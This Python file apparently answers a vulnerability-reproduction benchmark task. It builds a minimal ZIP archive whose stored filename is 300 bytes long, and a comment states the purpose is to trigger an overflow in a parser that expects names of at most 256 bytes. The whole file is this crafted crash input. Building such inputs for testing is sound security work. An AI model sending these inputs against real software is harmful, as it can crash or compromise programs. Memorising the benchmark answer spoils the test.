import struct
from typing import Optional


class Solution:
    def _build_zip_with_long_name(self, name_len: int) -> bytes:
        if name_len < 257:
            name_len = 257
        fname = (b"A" * name_len)

        # Local file header
        lf_sig = 0x04034B50
        ver_needed = 20
        gp_flag = 0
        comp_method = 0  # stored
        mod_time = 0
        mod_date = 0
        crc32 = 0
        comp_size = 0
        uncomp_size = 0
        extra_len = 0
        local_header = struct.pack(
            "<IHHHHHIIIHH",
            lf_sig,
            ver_needed,
            gp_flag,
            comp_method,
            mod_time,
            mod_date,
            crc32,
            comp_size,
            uncomp_size,
            len(fname),
            extra_len,
        ) + fname

        # Central directory header
        cd_sig = 0x02014B50
        ver_made_by = 20
        file_comment_len = 0
        disk_num_start = 0
        int_attr = 0
        ext_attr = 0
        local_header_offset = 0
        central_dir = struct.pack(
            "<IHHHHHHIIIHHHHHII",
            cd_sig,
            ver_made_by,
            ver_needed,
            gp_flag,
            comp_method,
            mod_time,
            mod_date,
            crc32,
            comp_size,
            uncomp_size,
            len(fname),
            extra_len,
            file_comment_len,
            disk_num_start,
            int_attr,
            ext_attr,
            local_header_offset,
        ) + fname

        # End of central directory record
        eocd_sig = 0x06054B50
        disk_num = 0
        cd_start_disk = 0
        entries_this_disk = 1
        total_entries = 1
        cd_size = len(central_dir)
        cd_offset = len(local_header)
        comment_len = 0
        eocd = struct.pack(
            "<IHHHHIIH",
            eocd_sig,
            disk_num,
            cd_start_disk,
            entries_this_disk,
            total_entries,
            cd_size,
            cd_offset,
            comment_len,
        )

        return local_header + central_dir + eocd

    def solve(self, src_path: str) -> bytes:
        # Minimal valid ZIP with a filename longer than 256 bytes to trigger the overflow.
        return self._build_zip_with_long_name(300)